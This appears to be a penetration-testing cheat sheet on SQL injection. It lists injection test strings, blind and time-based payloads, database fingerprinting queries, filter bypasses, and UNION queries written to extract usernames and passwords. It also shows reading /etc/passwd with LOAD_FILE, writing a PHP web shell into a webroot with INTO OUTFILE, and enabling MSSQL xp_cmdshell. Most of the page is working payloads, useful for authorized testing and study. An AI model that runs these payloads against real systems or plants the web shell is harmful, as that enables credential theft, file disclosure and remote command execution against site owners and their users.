---
title: SQL Injection
category: Web Application
order: 5
---

> **SQL Injection: Test Location and Strings**

**Pull usernames and passwords if successful**

**Test Locations:**
* GET URL query parameters
* POST parameters
* Cookie (session information)
* User-Agent

**Visable Test Strings:**
{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

**Blind Test Strings:**<br>
*Try the following to see if it provides valid results for text that was interpreted:*

Commenting out the end | <code> Brent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
Commenting with semicolon | <code> Brent' or 29=29; # <br> Dent' or 29=29;-- <br> Dent' or 29=29;-- - </code>
Commenting without semicolon | <code> Brent' or 1=1 # <br> Dent' or 1=1-- <br> Dent' or 1=1-- - </code>
Inline Commenting | <code> Bre'/* */'nt </code>
Concatenation | <code> De''nt <br> De'||'nt </code>
Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
Sleep MySQL | <code> Sleep(10) </code>
Sleep MySQL2 | <code> id=1-sleep(10)  </code>
Sleep MSSQL | <code> WAITFOR DELAY '0:0:10'  MSSQL </code> 

Math | <code> id=1-0 </code>


Determine the level of blindness:
{% highlight sql %}
Dent' AND 1;#
Dent' AND 1=1;#

Dent' AND 0;#
Dent' AND 1=0;#
#Look for differences
{% endhighlight %}

> **Online Tool to test syntax***

* [sqlfiddle](http://sqlfiddle.com/#!9/a6c585/51364)

> **SQL Injection: Database Identification**

MS SQL Server | Incorrect syntax near 'something'
MS SQL Server | <code> 'De'+'nt' </code>
MS SQL Server | <code> SELECT @@version  </code>
MS SQL Server | <code> @@pack_received </code>
MySQL | 'De' 'nt'
MySQL | <code> SELECT @@version  </code>
MySQL | <code> connection_id() </code>
Oracle | ORA-01756: quoted string not properly terminated
Oracle | <code> 'De'||'nt' </code>
Oracle | <code> BITAND(1,1) </code>
PostgreSQL | 5-digit Hex Error Code

> **SQL Injection: Database, Table, and Columns**

**MySQL:**

Database | schema_name FROM information_schema.schemata 
Table | table_name FROM information_schema.tables
Columns | column_name From information_schema.columns where table_name='users'

**SQL Server:**

Database | name FROM sys.databases 
Table | name FROM sys.tables 
Columns | name FROM sys.coumns

**Oracle DB:**

Database | owner FROM all_tables 
Table | table_name FROM all_tables 
Columns | column_name FROM all_tab_columns

> **SQL Injection Filter Bypass**

UTF-16 URL encoding for select and union:
%u0055Nion %u0053elect

Spaces:
union/**/select

> **SQL Injection Union**

1) Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
{% highlight sql %}
dent' and 'a'='a' ORDER BY 1; #
...until it breaks
dent' and 'a'='a' ORDER BY 5; #

Dent' UNION SELECT  NULL; #
..until it works
Dent' UNION SELECT  NULL, NULL, NULL, NULL; #
{% endhighlight %}

2) See which columns (e.g., numbers) are visable and correct data type (e.g., String/varchar) in the output. 
{% highlight sql %}
Dent' UNION SELECT  'X3Y2Z1', NULL, NULL, NULL; #
...until it works and visable in source (search for X3Y2Z1)
Dent' UNION SELECT  NULL, NULL, NULL, 'X3Y2Z1'; #
{% endhighlight %}

3) From the columns identified above, use one for the union. <br> *Note: It requires the same number of columns and compatable data type*
{% highlight sql %}
Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
<br>
or use NULL since it is compatable with everything
<br>
Dent' UNION SELECT NULL, NULL, NULL;--
<b>
jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
{% endhighlight %}

> **Blind SQL Injection Data Exfiltration**

Perform a binary search tree using substr: 

{% highlight sql %}
#Use
substr(([Query]),[Letter],[Word]) > "m"

substr((select table_name from information_schema.tables limit 1),1,1) > "m"
…
= "c"

{% endhighlight %}

> **Stacked Queries**

Allows multiple commands with a ';'  (Mostly MSSQL):
{% highlight sql %}
Dent' ;  CREATE TABLE exfil(data varchar(1000));-- 
{% endhighlight %}


> **Reading and Writing Files**

MySQL and MSSQL:
{% highlight sql %}
MySQL Reading:
Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23

MySQL Writing:
INTO OUTFILE 
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

SQL Server Reading: 
BULK INSERT
{% endhighlight %}

> **MSSQL Enable xp_cmdshell**

{% highlight sql %}
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

{% endhighlight %}



> **SQL Injection Cheat Sheets**

* [websec](https://websec.ca/kb/sql_injection)
* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)

